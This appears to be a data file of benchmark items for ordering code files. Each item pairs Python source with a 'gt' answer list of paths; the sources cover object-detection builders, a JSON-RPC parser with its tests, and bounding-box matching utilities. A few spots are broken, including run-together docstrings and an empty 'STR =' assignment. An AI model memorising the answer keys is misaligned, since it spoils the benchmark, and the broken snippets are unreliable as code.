'second_stage_balance_fraction': second_stage_balance_fraction,\n      'second_stage_non_max_suppression_fn':\n      second_stage_non_max_suppression_fn,\n      'second_stage_score_conversion_fn': second_stage_score_conversion_fn,\n      'second_stage_localization_loss_weight':\n      second_stage_localization_loss_weight,\n      'second_stage_classification_loss':\n      second_stage_classification_loss,\n      'second_stage_classification_loss_weight':\n      second_stage_classification_loss_weight,\n      'hard_example_miner': hard_example_miner,\n      'add_summaries': add_summaries}\n\n  if isinstance(second_stage_box_predictor, box_predictor.RfcnBoxPredictor):\n    return rfcn_meta_arch.RFCNMetaArch(\n        second_stage_rfcn_box_predictor=second_stage_box_predictor,\n        **common_kwargs)\n  else:\n    return faster_rcnn_meta_arch.FasterRCNNMetaArch(\n        initial_crop_size=initial_crop_size,\n        maxpool_kernel_size=maxpool_kernel_size,\n        maxpool_stride=maxpool_stride,\n        second_stage_mask_rcnn_box_predictor=second_stage_box_predictor,\n        second_stage_mask_prediction_loss_weight=(\n            second_stage_mask_prediction_loss_weight),\n        **common_kwargs)\n\n'CastAi/research/object_detection/eval.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nr\"\"\"Evaluation executable for detection models.\n\nThis executable is used to evaluate DetectionModels. There are two ways of\nconfiguring the eval job.\n\n1) A single pipeline_pb2.TrainEvalPipelineConfig file maybe specified instead.\nIn this mode, the --eval_training_data flag may be given to force the pipeline\nto evaluate on training data instead.\n\nExample usage:\n    ./eval \\\n        --logtostderr \\\n        --checkpoint_dir=path/to/checkpoint_dir \\\n        --eval_dir=path/to/eval_dir \\\n        --pipeline_config_path=pipeline_config.pbtxt\n\n2) Three configuration files may be provided: a model_pb2.DetectionModel\nconfiguration file to define what type of DetectionModel is being evaluated, an\ninput_reader_pb2.InputReader file to specify what data the model is evaluating\nand an eval_pb2.EvalConfig file to configure evaluation parameters.\n\nExample usage:\n    ./eval \\\n        --logtostderr \\\n        --checkpoint_dir=path/to/checkpoint_dir \\\n        --eval_dir=path/to/eval_dir \\\n        --eval_config_path=eval_config.pbtxt \\\n        --model_config_path=model_config.pbtxt \\\n        --input_config_path=eval_input_config.pbtxt\nA function to build localization and classification losses from config.Build losses based on the config.\n\n  Builds classification, localization losses and optionally a hard example miner\n  based on the config.\n\n  Args:\n    loss_config: A losses_pb2.Loss object.\n\n  Returns:\n    classification_loss: Classification loss object.\n    localization_loss: Localization loss object.\n    classification_weight: Classification loss weight.\n    localization_weight: Localization loss weight.\n    hard_example_miner: Hard example miner object.\n\n  Raises:\n    ValueError: If hard_example_miner is used with sigmoid_focal_loss.\n  Builds hard example miner based on the config.\n\n  Args:\n    config: A losses_pb2.HardExampleMiner object.\n    classification_weight: Classification loss weight.\n    localization_weight: Localization loss weight.\n\n  Returns:\n    Hard example miner.\n\n  Builds a classification loss for Faster RCNN based on the loss config.\n\n  Args:\n    loss_config: A losses_pb2.ClassificationLoss object.\n\n  Returns:\n    Loss based on the config.\n\n  Raises:\n    ValueError: On invalid loss_config.\n  Builds a localization loss based on the loss config.\n\n  Args:\n    loss_config: A losses_pb2.LocalizationLoss object.\n\n  Returns:\n    Loss based on the config.\n\n  Raises:\n    ValueError: On invalid loss_config.\n  Builds a classification loss based on the loss config.\n\n  Args:\n    loss_config: A losses_pb2.ClassificationLoss object.\n\n  Returns:\n    Loss based on the config.\n\n  Raises:\n    ValueError: On invalid loss_config.\n  \"\"\"\n  if not isinstance(loss_config, losses_pb2.ClassificationLoss):\n    raise ValueError('loss_config not of type losses_pb2.ClassificationLoss.')\n\n  loss_type = loss_config.WhichOneof('classification_loss')\n\n  if loss_type == 'weighted_sigmoid':\n    return losses.WeightedSigmoidClassificationLoss()\n\n  if loss_type == 'weighted_sigmoid_focal':\n    config = loss_config.weighted_sigmoid_focal\n    alpha = None\n    if config.HasField('alpha'):\n      alpha = config.alpha\n    return losses.SigmoidFocalClassificationLoss(\n        gamma=config.gamma,\n        alpha=alpha)\n\n  if loss_type == 'weighted_softmax':\n    config = loss_config.weighted_softmax\n    return losses.WeightedSoftmaxClassificationLoss(\n        logit_scale=config.logit_scale)\n\n  if loss_type == 'bootstrapped_sigmoid':\n    config = loss_config.bootstrapped_sigmoid\n    return losses.BootstrappedSigmoidClassificationLoss(\n        alpha=config.alpha,\n        bootstrap_type=('hard' if config.hard_bootstrap else 'soft'))\n\n  raise ValueError('Empty loss config.')\n",
        "gt": [
            "'CastAi/research/object_detection/builders/losses_builder.py'",
            "'CastAi/research/object_detection/builders/model_builder.py'",
            "'CastAi/research/object_detection/eval.py'"
        ]
    },
    {
        "files": [
            "'python-symmetric-jsonrpc/examples/ssl_client.py'",
            "'python-symmetric-jsonrpc/symmetricjsonrpc/json.py'",
            "'python-symmetric-jsonrpc/symmetricjsonrpc/__init__.py'"
        ],
        "content": "'python-symmetric-jsonrpc/examples/ssl_client.py'\n:\n\n\n\nimport M2Crypto\nimport symmetricjsonrpc, socket\n\nHOST='localhost'\nPORT=4712\n\nclass PingRPCClient(symmetricjsonrpc.RPCClient):\n    class Request(symmetricjsonrpc.RPCClient.Request):\n        def dispatch_request(self, subject):\n\n            assert subject['method'] == \"pingping\"\n            return \"pingpong\"\n\ndef main():\n    ctx = M2Crypto.SSL.Context()\n    ctx.set_verify(M2Crypto.SSL.verify_peer | M2Crypto.SSL.verify_fail_if_no_peer_cert, depth=9)\n    if ctx.load_verify_locations('server.pem') != 1: raise Exception('No CA certs')\n    s = M2Crypto.SSL.Connection(ctx)\n    s.connect((HOST, PORT))\n    client = PingRPCClient(s)\n    res = client.request(\"ping\", wait_for_response=False) == \"pong\"\n    client.notify(\"shutdown\")\n    client.shutdown()\n\nif __name__ == '__main__':\n    main()\n\n'python-symmetric-jsonrpc/symmetricjsonrpc/json.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport sys\nimport StringIO\nimport unittest\n\nimport wrappers\n\ndef from_json(str):\n\n    r = Reader(str)\n    return r.read_value()\n\ndef to_json(obj):\n\n    i = StringIO.StringIO()\n    w = Writer(i, encoding='UTF-8')\n    w.write_value(obj)\n    return i.getvalue()\n\nclass Writer(object):\n\n\n    def __init__(self, s, encoding=None):\n        self.encoding = encoding\n        self.s = wrappers.WriterWrapper(s)\n\n    def close(self):\n        self.s.close()\n\n    def write_value(self, value):\n        self.unflushed_write_value(value)\n        self.s.flush()\n\n    def unflushed_write_value(self, value):\n        if hasattr(value, '__to_json__'):\n            self.unflushed_write_value(value.__to_json__())\n        elif isinstance(value, unicode):\n            self.s.write('\"')\n            for c in value:\n                if c == '\\b':\n                    self.s.write(r'\\b')\n                elif c == '\\t':\n                    self.s.write(r'\\t')\n                elif c == '\\n':\n                    self.s.write(r'\\n')\n                elif c == '\\f':\n                    self.s.write(r'\\f')\n                elif c == '\\r':\n                    self.s.write(r'\\r')\n                elif c == '\"':\n                    self.s.write(r'\\\"')\n                elif c == '\\\\':\n                    self.s.write(r'\\\\')\n                elif c >= ' ' and c <= '~':\n                    self.s.write(c.encode('ascii'))\n                elif c > '~':\n                    self.s.write(r'\\u%04x' % ord(c))\n                else:\n                    raise Exception(\"Cannot encode character %x into json string\" % ord(c))\n            self.s.write('\"')\n        elif isinstance(value, str):\n            self.unflushed_write_value(value.decode(self.encoding or sys.getdefaultencoding()))\n        elif isinstance(value, bool):\n            self.s.write(value and 'true' or 'false')\n        elif isinstance(value, int) or isinstance(value, float) or isinstance(value, long):\n            r = repr(value)\n            if r[-1] == 'L':\n                r = r[:-1]\n            self.s.write(r)\n        elif value == None:\n            self.s.write('null')\n        elif hasattr(value, '__iter__'):\n            if hasattr(value,'iteritems'):\n                self.s.write('{')\n                for n, (k, v) in enumerate(value.iteritems()):\n                    if (n > 0):\n                        self.s.write(',')\n                    self.unflushed_write_value(k)\n                    self.s.write(':')\n                    self.unflushed_write_value(v)\n                self.s.write('}')\n            else:\n                self.s.write('[')\n                for n, i in enumerate(value):\n                    if (n > 0):\n                        self.s.write(',')\n                    self.unflushed_write_value(i)\n                self.s.write(']')\n        else:\n            raise Exception(\"Cannot encode %s of type %s to json\" % (value,type(value)))\n\n    def unflushed_write_values(self, values):\n        for value in values:\n            self.unflushed_write_value(value)\n\nclass Tokenizer(object):\n\n\n    def __init__(self, s):\n        self.closable = wrappers.ReaderWrapper(s)\n        self.s = wrappers.ReIterator(self.closable)\n\n\n\n    def pair_begin(self): pass\n    def pair_end(self): pass\n    def object_begin(self): pass\n    def object_end(self): pass\n    def array_begin(self): pass\n    def array_end(self): pass\n    def string_begin(self): pass\n    def string_end(self): pass\n    def number_begin(self): pass\n    def number_end(self): pass\n    def char(self, c): pass\n    def true(self): pass\n    def false(self): pass\n    def null(self): pass\n    def fail(self, msg): pass\n\n    def _assert(self, c, values):\n        if c not in values:\n            self.fail(\"%s not in %s\" % (repr(c), repr(values)))\n        return c\n\n    def _read_space(self):\n        while self.s.peek() in ' \\t\\r\\n':\n            self.s.next()\n\n    def _read_pair(self):\n        self.pair_begin()\n        self._read_string()\n        self._read_space()\n        self._assert(self.s.next(), ':')\n        self._read_space()\n        self._read_value()\n        self.pair_end()\n\n    def _read_object(self):\n        self.object_begin()\n        self._assert(self.s.next(), '{')\n        self._read_space()\n        if self.s.peek() != '}':\n            while True:\n                self._read_pair()\n                self._read_space()\n                if self.s.peek() == '}':\n                    break\n                self._assert(self.s.next(), ',')\n                self._read_space()\n        self._assert(self.s.next(), '}')\n        self.object_end()\n\n    def _read_array(self):\n        self.array_begin()\n        self._assert(self.s.next(), '[')\n        self._read_space()\n        if self.s.peek() != ']':\n            while True:\n                self._read_value()\n                self._read_space()\n                if self.s.peek() == ']':\n                    break\n                self._assert(self.s.next(), ',')\n                self._read_space()\n        self._assert(self.s.next(), ']')\n        self.array_end()\n\n    def _read_char(self):\n        c = self.s.next()\n        if c == '\\\\':\n            c = self.s.next()\n            if c == 'b': c = '\\b'\n            elif c == 'f': c = '\\f'\n            elif c == 'n': c = '\\n'\n            elif c == 'r': c = '\\r'\n            elif c == 't': c = '\\t'\n            elif c == 'u':\n                d1 = self.s.next()\n                d2 = self.s.next()\n                d3 = self.s.next()\n                d4 = self.s.next()\n                c = unichr(int(d1+d2+d3+d4, 16))\n            else: self._assert(c, '\"\\\\/')\n        self.char(c)\n\n    def _read_string(self):\n        self.string_begin()\n        self._assert(self.s.next(), '\"')\n        while self.s.peek() != '\"':\n            self._read_char()\n        self._assert(self.s.next(), '\"')\n        self.string_end()\n\n    def _read_number(self):\n        self.number_begin()\n\n\n\n\n\n        try:\n            if self.s.peek() == '-':\n                self.char(self.s.next())\n            if self.s.peek() == '0':\n                self.char(self.s.next())\n            else:\n                self._assert(self.s.peek(), '123456789')\n                self.char(self.s.next())\n                while self.s.peek() in '0123456789':\n                    self.char(self.s.next())\n            if self.s.peek() == '.':\n                self.char(self.s.next())\n                self._assert(self.s.peek(), '0123456789')\n                while self.s.peek() in '0123456789':\n                    self.char(self.s.next())\n            if self.s.peek() in 'eE':\n                self.char(self.s.next())\n                if self.s.peek() in '+-':\n                    self.char(self.s.next())\n                self._assert(self.s.peek(), '0123456789')\n                while self.s.peek() in '0123456789':\n                    self.char(self.s.next())\n        except EOFError:\n            pass\n        self.number_end()\n\n    def _read_true(self):\n        self._assert(self.s.next(), 't')\n        self._assert(self.s.next(), 'r')\n        self._assert(self.s.next(), 'u')\n        self._assert(self.s.next(), 'e')\n        self.true()\n\n    def _read_false(self):\n        self._assert(self.s.next(), 'f')\n        self._assert(self.s.next(), 'a')\n        self._assert(self.s.next(), 'l')\n        self._assert(self.s.next(), 's')\n        self._assert(self.s.next(), 'e')\n        self.false()\n\n    def _read_null(self):\n        self._assert(self.s.next(), 'n')\n        self._assert(self.s.next(), 'u')\n        self._assert(self.s.next(), 'l')\n        self._assert(self.s.next(), 'l')\n        self.null()\n\n    def _read_value(self):\n        self._read_space()\n        c = self.s.peek()\n        if c == '{': return self._read_object()\n        elif c == '[': return self._read_array()\n        elif c == '\"': return self._read_string()\n        elif c == 't': return self._read_true()\n        elif c == 'f': return self._read_false()\n        elif c == 'n': return self._read_null()\n        else: return self._read_number()\n\n    def close(self):\n        self.closable.close()\n\n    def read_value(self):\n        return self._read_value()\n\n    def read_values(self):\n        while True:\n            self._read_value()\n\nclass Reader(Tokenizer):\n\n\n    def __init__(self, s, object_initializer = None):\n        Tokenizer.__init__(self, s)\n        self.object_initializer = object_initializer\n    def _struct_begin(self):\n        self.state.append([])\n    def _struct_end(self):\n        self.state[-2].append(self.state[-1])\n        del self.state[-1]\n    def pair_begin(self): self._struct_begin()\n    def pair_end(self): self._struct_end()\n    def object_begin(self): self._struct_begin()\n    def object_end(self):\n        self.state[-1] = dict(self.state[-1])\n        if '__jsonclass__' in self.state[-1]:\n            self.class_object()\n        self._struct_end()\n    def class_object(self):\n        if self.object_initializer and self.state[-1]['__jsonclass__'][0] in self.object_initializer:\n            cls = self.state[-1].pop('__jsonclass__')\n            params = cls[1:]\n            cls = self.object_initializer[cls[0]]\n            self.state[-1] = cls(params, self.state[-1])\n    def array_begin(self): self._struct_begin()\n    def array_end(self): self._struct_end()\n    def string_begin(self): self.state.append(u\"\")\n    def string_end(self):  self._struct_end()\n    def number_begin(self): self.state.append(u\"\")\n    def number_end(self):\n        if '.' in self.state[-1] or 'e' in self.state[-1] or 'E' in self.state[-1]:\n            self.state[-1] = float(self.state[-1])\n        else:\n            self.state[-1] = int(self.state[-1])\n        self._struct_end()\n    def char(self, c): self.state[-1] = self.state[-1] + c\n    def true(self): self.state[-1].append(True)\n    def false(self): self.state[-1].append(False)\n    def null(self): self.state[-1].append(None)\n    def fail(self, msg): raise Exception(msg)\n    def read_value(self):\n        self.state = [[]]\n        self._read_value()\n        return self.state[-1][-1]\n    def read_values(self):\n        try:\n            while True:\n                self.state = [[]]\n                self._read_value()\n                yield self.state[-1][-1]\n        except EOFError:\n            return\n\nclass DebugTokenizer(object):\n    def pair_begin(self): print '('; print self.state; return super(DebugTokenizer, self).pair_begin()\n    def pair_end(self): print ')'; print self.state; return super(DebugTokenizer, self).pair_end()\n    def object_begin(self): print '{'; print self.state; return super(DebugTokenizer, self).object_begin()\n    def object_end(self): print '}'; print self.state; return super(DebugTokenizer, self).object_end()\n    def array_begin(self): print '['; print self.state; return super(DebugTokenizer, self).array_begin()\n    def array_end(self): print ']'; print self.state; return super(DebugTokenizer, self).array_end()\n    def string_begin(self): print '\"'; print self.state; return super(DebugTokenizer, self).string_begin()\n    def string_end(self): print '\"'; print self.state; return super(DebugTokenizer, self).string_end()\n    def number_begin(self): print '<'; print self.state; return super(DebugTokenizer, self).number_begin()\n    def number_end(self): print '>'; print self.state; return super(DebugTokenizer, self).number_end()\n    def char(self, c): print repr(c); print self.state; return super(DebugTokenizer, self).char(c)\n    def true(self): print \"TRUE\"; print self.state; return super(DebugTokenizer, self).true()\n    def false(self): print \"FALSE\"; print self.state; return super(DebugTokenizer, self).false()\n    def null(self): print \"NULL\"; print self.state; return super(DebugTokenizer, self).null()\n    def fail(self, msg): super(DebugTokenizer, self).fail(); raise Exception(msg)\n\nclass DebugReader(DebugTokenizer, Reader): pass\n\n\n\nclass TestJson(unittest.TestCase):\n    import socket\n    import tempfile\n    import threading\n\n    def assertReadEqual(self, str, obj):\n        reader = Reader(str)\n        read_obj = reader.read_value()\n        self.assertEqual(obj, read_obj)\n        io = self.tempfile.TemporaryFile()\n        Writer(io).write_value(obj)\n        io.seek(0)\n        reader1 = Reader(io)\n        read_obj1 = reader1.read_value()\n        self.assertEqual(obj, read_obj1)\n    def assertWriteEqual(self, str, obj):\n        self.assertEqual(str, to_json(obj))\n    def test_to_json(self):\n        STR = '[\"string\",false,null]'\n        OBJ = [u\"string\", False, None]\n        self.assertEqual(to_json(OBJ), STR)\n    def test_from_json(self):\n        STR = '{\"array\": [\"string\",false,null],\"object\":{\"number\":4711,\"bool\":true}}'\n        OBJ = {u\"array\": [u\"string\", False, None], u\"object\": {u\"number\": 4711, u\"bool\": True}}\n        self.assertEqual(from_json(STR), OBJ)\n    def test_single_number_from_json(self):\n        STR = '3.33'\n        OBJ = 3.33\n        self.assertEqual(from_json(STR), OBJ)\n    def test_read_value(self):\n        STR = '{\"array\": [\"string\",false,null],\"object\":{\"number\":4711,\"bool\":true}}'\n        OBJ = {u\"array\": [u\"string\", False, None], u\"object\": {u\"number\": 4711, u\"bool\": True}}\n        self.assertReadEqual(STR, OBJ)\n    def test_read_numbers(self):\n        STR = '[0, -1, 0.2, 1e+4, -2.5E-5, 1e20]'\n        self.assertReadEqual(STR, eval(STR))\n    def test_read_escape_string(self):\n        STR = r'\"\\b\\f\\n\\r\\t\\u1234\"'\n        OBJ = u\"\\b\\f\\n\\r\\t\\u1234\"\n        self.assertReadEqual(STR, OBJ)\n    def test_read_quote_string(self):\n        STR = r'\"\\\"\"'\n        OBJ = u\"\\\"\"\n        self.assertReadEqual(STR, OBJ)\n    def test_read_solidus_string(self):\n        STR = r'\"\\/\"'\n        OBJ = u\"/\"\n        self.assertReadEqual(STR, OBJ)\n    def test_read_reverse_solidus_string(self):\n        STR = r'\"\\\\\"'\n        OBJ = u\"\\\\\"\n        self.assertReadEqual(STR, OBJ)\n    def test_read_whitespace(self):\n        STR =\n        self.assertReadEqual(STR, eval(STR))\n    def test_read_values(self):\n        STR = \"{}[]true false null\"\n        reader = Reader(STR)\n        values = [{}, [], True, False, None]\n\n        for i, r in enumerate(reader.read_values()):\n            self.assertEqual(r, values[i])\n    def test_encode_invalid_control_character(self):\n        self.assertRaises(Exception, lambda: json('\\x00', self.tempfile.TemporaryFile()))\n    def test_encode_invalid_object(self):\n        self.assertRaises(Exception, lambda: json(Tokenizer(\"\"), self.tempfile.TemporaryFile()))\n    def test_read_object(self):\n        STR = '{\"__jsonclass__\":[\"foo\",\"bar\"],\"naja\":123}'\n        def foo(arg, kw):\n            assert arg == [\"bar\"]\n            assert kw == {\"naja\":123}\n            return True\n        reader = Reader(STR, {'foo': foo})\n        assert reader.read_value() is True\n    def test_broken_socket(self):\n        sockets = self.socket.socketpair()\n        reader = Reader(sockets[0])\n        sockets[0].close()\n        self.assertRaises(self.socket.error, lambda: reader.read_value())\n\n    def test_eof(self):\n        import cStringIO\n\n        obj = {'foo':1, 'bar':[1, 2]}\n        io0 = self.tempfile.TemporaryFile()\n        Writer(io0).write_value(obj)\n        io0.seek(0)\n        full_json_string = io0.read()\n\n        for json_string, eof_error in ((full_json_string, False), (full_json_string[0:10], True), ('', True)):\n            io1 = self.tempfile.TemporaryFile()\n            io1.write(json_string)\n            io1.seek(0)\n            reader = Reader(io1)\n            if eof_error:\n                self.assertRaises(EOFError, lambda: reader.read_value())\n            else:\n                self.assertEqual(obj, reader.read_value())\n\n\n    def test_closed_socket(self):\n        class Timeout(self.threading.Thread):\n            def run(self1):\n                obj = {'foo':1, 'bar':[1, 2]}\n                io = self.tempfile.TemporaryFile()\n                Writer(io).write_value(obj)\n                io.seek(0)\n                full_json_string = io.read()\n\n                for json_string, eof_error in ((full_json_string, False), (full_json_string[0:10], True), ('', True)):\n                    sockets = self.socket.socketpair()\n                    reader = Reader(sockets[0])\n\n                    for c in json_string:\n                        while not sockets[1].send(c): pass\n                    sockets[1].close()\n                    if eof_error:\n                        self.assertRaises(EOFError, lambda: reader.read_value())\n                    else:\n                        self.assertEqual(obj, reader.read_value())\n\n        timeout = Timeout()\n        timeout.start()\n        timeout.join(3)\n        if timeout.isAlive():\n            self.fail('Reader has hung.')\n\n    def test_write_object(self):\n        class SomeObj(object):\n            def __init__(self, x):\n                self.x = x\n\n            def __to_json__(self):\n                return {'__jsonclass__': ['SomeObj'], 'x': self.x}\n\n        self.assertWriteEqual('{\"x\":4711,\"__jsonclass__\":[\"SomeObj\"]}', SomeObj(4711))\n\nif __name__ == \"__main__\":\n    unittest.main()\n\n'python-symmetric-jsonrpc/symmetricjsonrpc/__init__.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom __future__ import with_statement\n\nfrom json import *\nfrom dispatcher import *\nfrom rpc import *\n\n__all__ = [\"ClientConnection\",\n           \"Connection\",\n           \"RPCClient\",\n           \"RPCP2PNode\",\n           \"RPCServer\",\n           \"Reader\",\n           \"ServerConnection\",\n           \"ShutDownThread\",\n           \"Thread\",\n           \"ThreadedClient\",\n           \"Tokenizer\",\n           \"Writer\",\n           \"from_json\",\n           \"to_json\"]\n",
        "gt": [
            "'python-symmetric-jsonrpc/symmetricjsonrpc/json.py'",
            "'python-symmetric-jsonrpc/symmetricjsonrpc/__init__.py'",
            "'python-symmetric-jsonrpc/examples/ssl_client.py'"
        ]
    },
    {
        "files": [
            "'pytorch-toolbelt/pytorch_toolbelt/utils/bboxes_utils.py'",
            "'pytorch-toolbelt/pytorch_toolbelt/utils/__init__.py'",
            "'pytorch-toolbelt/pytorch_toolbelt/modules/encoders/timm/dpn.py'",
            "'pytorch-toolbelt/pytorch_toolbelt/modules/encoders/timm/hrnet.py'",
            "'pytorch-toolbelt/pytorch_toolbelt/modules/interfaces.py'",
            "'pytorch-toolbelt/pytorch_toolbelt/modules/encoders/timm/__init__.py'"
        ],
        "content": "'pytorch-toolbelt/pytorch_toolbelt/utils/bboxes_utils.py'\n:from collections import namedtuple\nfrom typing import Optional\n\nimport numpy as np\nimport torch\nfrom pytorch_toolbelt.utils import to_numpy\nfrom torchvision.ops import box_iou\n\n__all__ = [\"match_bboxes\", \"match_bboxes_hungarian\", \"BBoxesMatchResult\"]\n\nBBoxesMatchResult = namedtuple(\n    \"BBoxesMatchResult\",\n    [\n\n        \"true_positives\",\n\n        \"false_positives\",\n\n        \"false_negatives\",\n\n\n        \"confusion_matrix\",\n\n\n        \"true_positive_indexes\",\n    ],\n)\n\n\n@torch.no_grad()\ndef match_bboxes(\n    pred_boxes: np.ndarray,\n    pred_labels: np.ndarray,\n    pred_scores: np.ndarray,\n    true_boxes: np.ndarray,\n    true_labels: np.ndarray,\n    num_classes: int,\n    iou_threshold: float = 0.5,\n) -> BBoxesMatchResult:\n    \"\"\"\n    Match predictect and ground-truth bounding boxes. Boxes with higher confidence are matched the first.\n    There can be only one match between predicted and ground-truth box.\n\n    For multi-class case, if the boxes match, but their classes does not match, this counts as 1 FN\n    to ground-truth class and 1 FP to predicted class.\n\n    :param pred_boxes: Detected bboxes in [x1, y1, x2, y2] format of shape [N,4]\n    :param pred_labels: Detected labels of shape [N]\n    :param pred_scores: Detected scores of shape [N]. Optional\n    :param true_boxes:  Ground-truth bboxes in [x1, y1, x2, y2] format of shape [M,4]\n    :param true_labels: Ground-truth labels of shape [M]\n    :param num_classes: Total number of classes\n    :param iou_threshold: IoU threshold to count detection as \"match\"\n    :return:\n        Tuple of [num_classes], [num_classes], [num_classes] corresponding to\n        true positives, false positive and false negative counts per class\n    \"\"\"\n    if len(pred_labels) != len(pred_boxes) or len(pred_labels) != len(pred_scores):\n        raise ValueError(\n            f\"Inconsistent lengths of predicted bboxes:{len(pred_boxes)} labels:{len(pred_labels)} and their scores: {len(pred_scores)}\"\n        )\n\n    if len(true_boxes) != len(true_labels):\n        raise ValueError(\n            f\"Inconsistent lengths of ground-truth bboxes:{len(true_boxes)} and their labels:{len(true_labels)}\"\n        )\n\n    true_positives = np.zeros(num_classes, dtype=int)\n    false_positives = np.zeros(num_classes, dtype=int)\n    false_negatives = np.zeros(num_classes, dtype=int)\n\n\n    confusion_matrix = np.zeros((num_classes + 1, num_classes + 1), dtype=int)\n    none_class = num_classes\n\n    num_pred_objects = len(pred_boxes)\n    num_true_objects = len(true_boxes)\n\n    if num_pred_objects == 0 and num_true_objects == 0:\n        return BBoxesMatchResult(\n            true_positives=true_positives,\n            false_positives=false_positives,\n            false_negatives=false_negatives,\n            confusion_matrix=confusion_matrix,\n            true_positive_indexes=np.zeros((0, 2), dtype=int),\n        )\n    elif num_pred_objects == 0:\n        for true_class in true_labels:\n            false_negatives[true_class] += 1\n            confusion_matrix[true_class, none_class] += 1\n        return BBoxesMatchResult(\n            true_positives=true_positives,\n            false_positives=false_positives,\n            false_negatives=false_negatives,\n            confusion_matrix=confusion_matrix,\n            true_positive_indexes=np.zeros((0, 2), dtype=int),\n        )\n    elif num_true_objects == 0:\n        for pred_class in pred_labels:\n            false_positives[pred_class] += 1\n            confusion_matrix[none_class, pred_class] += 1\n        return BBoxesMatchResult(\n            true_positives=true_positives,\n            false_positives=false_positives,\n            false_negatives=false_negatives,\n            confusion_matrix=confusion_matrix,\n            true_positive_indexes=np.zeros((0, 2), dtype=int),\n        )\n\n\n    order = np.argsort(-pred_scores)\n    rorder = np.argsort(order)\n    pred_boxes = pred_boxes[order]\n    pred_labels = pred_labels[order]\n\n    iou_matrix: np.ndarray = to_numpy(\n        box_iou(torch.from_numpy(pred_boxes).float(), torch.from_numpy(true_boxes).float())\n    )\n\n    remainig_preds = np.ones(num_pred_objects, dtype=bool)\n    remainig_trues = np.ones(num_true_objects, dtype=bool)\n    true_positive_indexes = []\n\n    for ci in range(num_true_objects):\n\n        candidates = np.flatnonzero(iou_matrix[:, ci] >= iou_threshold)\n        if len(candidates):\n            ri = candidates[0]\n\n            iou_matrix[ri, :] = 0\n\n            remainig_preds[ri] = False\n            remainig_trues[ci] = False\n\n            pred_class = pred_labels[ri]\n            true_class = true_labels[ci]\n\n            if pred_class == true_class:\n\n                true_positives[true_class] += 1\n\n                true_positive_indexes.append((rorder[ri], ci))\n            else:\n\n\n                false_positives[pred_class] += 1\n                false_negatives[true_class] += 1\n\n            confusion_matrix[true_class, pred_class] += 1\n\n    if remainig_preds.any():\n        for pred_class in pred_labels[remainig_preds]:\n            false_positives[pred_class] += 1\n            confusion_matrix[none_class, pred_class] += 1\n\n    if remainig_trues.any():\n        for true_class in true_labels[remainig_trues]:\n            false_negatives[true_class] += 1\n            confusion_matrix[true_class, none_class] += 1\n\n    return BBoxesMatchResult(\n        true_positives=true_positives,\n        true_positive_indexes=np.array(true_positive_indexes, dtype=int).reshape((-1, 2)),\n        false_positives=false_positives,\n        false_negatives=false_negatives,\n        confusion_matrix=confusion_matrix,\n    )\n\n\n@torch.no_grad()\ndef match_bboxes_hungarian(\n    pred_boxes: np.ndarray,\n    pred_labels: np.ndarray,\n    true_boxes: np.ndarray,\n    true_labels: np.ndarray,\n    num_classes: int,\n    iou_threshold: float = 0.5,\n) -> BBoxesMatchResult:\n    \"\"\"\n    Match predictect and ground-truth bounding boxes using hungarian matching algorithm.\n\n    For multi-class case, if the boxes match, but their classes does not match, this counts as 1 FN\n    to ground-truth class and 1 FP to predicted class.\n\n    :param pred_boxes: Detected bboxes in [x1, y1, x2, y2] format of shape [N,4]\n    :param pred_labels: Detected labels of shape [N]\n    :param true_boxes:  Ground-truth bboxes in [x1, y1, x2, y2] format of shape [M,4]\n    :param true_labels: Ground-truth labels of shape [M]\n    :param num_classes: Total number of classes\n    :param iou_threshold: IoU threshold to count detection as \"match\"\n    :param min_size: If not None, will exclude boxes with area smaller than this parameter from evaluation\n    :return:\n        Tuple of [num_classes], [num_classes], [num_classes] corresponding to\n        true positives, false positive and false negative counts per class\n    \"\"\"\n    from scipy.optimize import linear_sum_assignment\n\n    if len(pred_labels) != len(pred_boxes):\n        raise ValueError(f\"Inconsistent lengths of predicted bboxes:{len(pred_boxes)} labels:{len(pred_labels)}\")\n\n    if len(true_boxes) != len(true_labels):\n        raise ValueError(\n            f\"Inconsistent lengths of ground-truth bboxes:{len(true_boxes)} and their labels:{len(true_labels)}\"\n        )\n\n    true_positives = np.zeros(num_classes, dtype=int)\n    false_positives = np.zeros(num_classes, dtype=int)\n    false_negatives = np.zeros(num_classes, dtype=int)\n\n\n    confusion_matrix = np.zeros((num_classes + 1, num_classes + 1), dtype=int)\n    none_class = num_classes\n\n    num_pred_objects = len(pred_boxes)\n    num_true_objects = len(true_boxes)\n\n    if num_pred_objects == 0 and num_true_objects == 0:\n        return BBoxesMatchResult(\n            true_positives=true_positives,\n            false_positives=false_positives,\n            false_negatives=false_negatives,\n            confusion_matrix=confusion_matrix,\n            true_positive_indexes=np.zeros((0, 2), dtype=int),\n        )\n    elif num_pred_objects == 0:\n        for true_class in true_labels:\n            false_negatives[true_class] += 1\n            confusion_matrix[true_class, none_class] += 1\n        return BBoxesMatchResult(\n            true_positives=true_positives,\n            false_positives=false_positives,\n            false_negatives=false_negatives,\n            confusion_matrix=confusion_matrix,\n            true_positive_indexes=np.zeros((0, 2), dtype=int),\n        )\n    elif num_true_objects == 0:\n        for pred_class in pred_labels:\n            false_positives[pred_class] += 1\n            confusion_matrix[none_class, pred_class] += 1\n        return BBoxesMatchResult(\n            true_positives=true_positives,\n            false_positives=false_positives,\n            false_negatives=false_negatives,\n            confusion_matrix=confusion_matrix,\n            true_positive_indexes=np.zeros((0, 2), dtype=int),\n        )\n\n    iou_matrix = to_numpy(box_iou(torch.from_numpy(pred_boxes).float(), torch.from_numpy(true_boxes).float()))\n    row_ind, col_ind = linear_sum_assignment(iou_matrix, maximize=True)\n\n    remainig_preds = np.ones(num_pred_objects, dtype=bool)\n    remainig_trues = np.ones(num_true_objects, dtype=bool)\n\n    true_positive_indexes = []\n\n    for ri, ci in zip(row_ind, col_ind):\n        pred_class = pred_labels[ri]\n        true_class = true_labels[ci]\n        if iou_matrix[ri, ci] >= iou_threshold:\n            remainig_preds[ri] = False\n            remainig_trues[ci] = False\n            if pred_class == true_class:\n\n                true_positives[true_class] += 1\n                true_positive_indexes.append((ri, ci))\n            else:\n\n\n                false_positives[pred_class] += 1\n                false_negatives[true_class] += 1\n\n            confusion_matrix[true_class, pred_class] += 1\n\n    if remainig_preds.any():\n        for pred_class in pred_labels[remainig_preds]:\n            false_positives[pred_class] += 1\n            